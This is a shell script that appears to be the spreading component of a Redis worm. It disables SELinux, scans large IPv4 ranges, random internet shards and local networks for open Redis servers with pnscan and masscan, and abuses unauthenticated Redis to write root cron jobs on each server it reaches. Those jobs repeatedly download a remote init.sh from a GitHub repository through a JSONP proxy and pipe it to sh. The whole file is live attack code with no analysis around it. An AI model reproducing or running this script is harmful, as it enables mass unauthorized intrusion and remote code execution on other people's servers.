#!/bin/sh
setenforce 0 2>/dev/null
ulimit -u 50000
sleep 1
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2>/dev/null
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2>/dev/null
sleep 1
    if [ -f "/bin/ps.original" ]
    then
        ps.original -fe|grep pnscan |grep -v grep
    else
        ps -fe|grep pnscan |grep -v grep
    fi
if [ $? -ne 0 ]
then
	rm -rf .dat .shard .ranges .lan 2>/dev/null
	sleep 1
	echo 'config set dbfilename "backup.db"' > .dat
	echo 'save' >> .dat
	echo 'config set stop-writes-on-bgsave-error no' >> .dat
	echo 'flushall' >> .dat
	echo 'set backup1 "\n\n\n*/2 * * * * cd1 -fsSL https://jsonp.afeld.me/?url=https://raw.githubusercontent.com/Godover/config/main/init.sh | sh\n\n"' >> .dat
	echo 'set backup2 "\n\n\n*/3 * * * * wget -q -O- https://jsonp.afeld.me/?url=https://raw.githubusercontent.com/Godover/config/main/init.sh | sh\n\n"' >> .dat
	echo 'set backup3 "\n\n\n*/4 * * * * curl -fsSL https://jsonp.afeld.me/?url=https://raw.githubusercontent.com/Godover/config/main/init.sh | sh\n\n"' >> .dat
	echo 'set backup4 "\n\n\n*/5 * * * * wd1 -q -O- https://jsonp.afeld.me/?url=https://raw.githubusercontent.com/Godover/config/main/init.sh | sh\n\n"' >> .dat
	echo 'config set dir "/var/spool/cron/"' >> .dat
	echo 'config set dbfilename "root"' >> .dat
	echo 'save' >> .dat
	echo 'config set dir "/var/spool/cron/crontabs"' >> .dat
	echo 'save' >> .dat
	echo 'flushall' >> .dat
	echo 'set backup1 "\n\n\n*/2 * * * * root cd1 -fsSL https://jsonp.afeld.me/?url=https://raw.githubusercontent.com/Godover/config/main/init.sh | sh\n\n"' >> .dat
	echo 'set backup2 "\n\n\n*/3 * * * * root wget -q -O- https://jsonp.afeld.me/?url=https://raw.githubusercontent.com/Godover/config/main/init.sh | sh\n\n"' >> .dat
	echo 'set backup3 "\n\n\n*/4 * * * * root curl -fsSL https://jsonp.afeld.me/?url=https://raw.githubusercontent.com/Godover/config/main/init.sh | sh\n\n"' >> .dat
	echo 'set backup4 "\n\n\n*/5 * * * * root wd1 -q -O- https://jsonp.afeld.me/?url=https://raw.githubusercontent.com/Godover/config/main/init.sh | sh\n\n"' >> .dat
	echo 'config set dir "/etc/cron.d/"' >> .dat
	echo 'config set dbfilename "zzh"' >> .dat
	echo 'save' >> .dat
	echo 'config set dir "/etc/"' >> .dat
	echo 'config set dbfilename "crontab"' >> .dat
	echo 'save' >> .dat
	sleep 1
	pnx=pnscan
	[ -x /usr/local/bin/pnscan ] && pnx=/usr/local/bin/pnscan
	[ -x /usr/bin/pnscan ] && pnx=/usr/bin/pnscan
	for x in $( echo -e "47\n39\n121\n8\n106\n101\n120\n123\n139\n118\n81\n49\n42\n119\n116\n111\n182\n114\n112\n115\n124\n59\n117\n45\n36\n129\n172\n122\n52\n175\n1\n60\n61\n218\n159\n188\n180\n113\n103\n192\n183\n150\n223\n222\n140\n132\n221\n193\n110\n62\n34\n3\n219\n212\n211\n202\n149\n148\n14\n13" | sort -R ); do
	for y in $( seq 0 255 | sort -R ); do
	$pnx -t256 -R '6f 73 3a 4c 69 6e 75 78' -W '2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a' $x.$y.0.0/16 6379 > .r.$x.$y.o
	awk '/Linux/ {print $1, $3}' .r.$x.$y.o > .r.$x.$y.l
	while read -r h p; do
	cat .dat | redis-cli -h $h -p $p --raw &
	done < .r.$x.$y.l
	done
	done
	sleep 1
	masscan --max-rate 10000 -p6379 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .shard
	sleep 1
	while read -r h p; do
	cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
	done < .shard
	sleep 1
	masscan --max-rate 10000 -p6379 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .ranges
	sleep 1
	while read -r h p; do
	cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
	done < .ranges
	sleep 1
	ip a | grep -oE '([0-9]{1,3}.?){4}/[0-9]{2}' 2>/dev/null | sed 's/\/\([0-9]\{2\}\)/\/16/g' > .inet
	sleep 1
	masscan --max-rate 10000 -p6379 -iL .inet | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .lan
	sleep 1
	while read -r h p; do
	cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
	done < .lan
	sleep 60
	rm -rf .dat .shard .ranges .lan 2>/dev/null
else
	echo "root runing....."
fi

